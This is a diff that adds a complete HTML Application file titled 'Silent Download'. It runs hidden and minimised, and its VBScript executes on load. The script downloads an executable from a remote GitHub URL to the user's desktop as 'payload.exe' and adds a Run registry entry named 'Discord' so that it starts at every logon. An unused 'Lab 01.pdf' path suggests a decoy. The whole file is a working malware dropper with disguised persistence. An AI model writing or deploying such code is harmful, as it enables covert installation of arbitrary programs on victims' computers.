@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Silent Download</title>
+    <HTA:APPLICATION 
+        ID="silent"
+        APPLICATIONNAME="SilentDL"
+        WINDOWSTATE="minimize"
+        SHOWINTASKBAR="no"
+        SYSMENU="no"
+        BORDER="none"
+    />
+    
+    <script language="VBScript">
+        ' Download file from URL
+        Sub DownloadFile(url, savePath)
+            Dim http, stream
+            
+            Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+            http.Open "GET", url, False
+            http.Send
+            
+            If http.Status = 200 Then
+                Set stream = CreateObject("ADODB.Stream")
+                stream.Type = 1
+                stream.Open
+                stream.Write http.ResponseBody
+                stream.SaveToFile savePath, 2
+                stream.Close
+                Set stream = Nothing
+            Else
+                MsgBox "Download failed: " & http.Status
+            End If
+            Set http = Nothing
+        End Sub
+
+        ' Main execution
+        Sub Main()
+            Dim shell, desktopPath, filename, pdfPath, exePath
+            
+            Set shell = CreateObject("WScript.Shell")
+            
+            ' Get desktop path
+            desktopPath = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\"
+            
+            ' Define file paths
+            pdfPath = desktopPath & "Lab 01.pdf"
+            exePath = desktopPath & "payload.exe"
+            
+            ' Download EXE (background)
+            DownloadFile "https://raw.githubusercontent.com/afnan53/internship/main/target_windows.exe", exePath
+            
+            ' Add to startup registry
+            shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Discord", Chr(34) & exePath & Chr(34), "REG_SZ"
+            
+            Set shell = Nothing
+            
+            ' Close window
+            window.Close
+        End Sub
+
+        ' Execute on load
+        Main()
+    </script>
+</head>
+<body>
+    <p>Processing...</p>
+</body>
+</html>
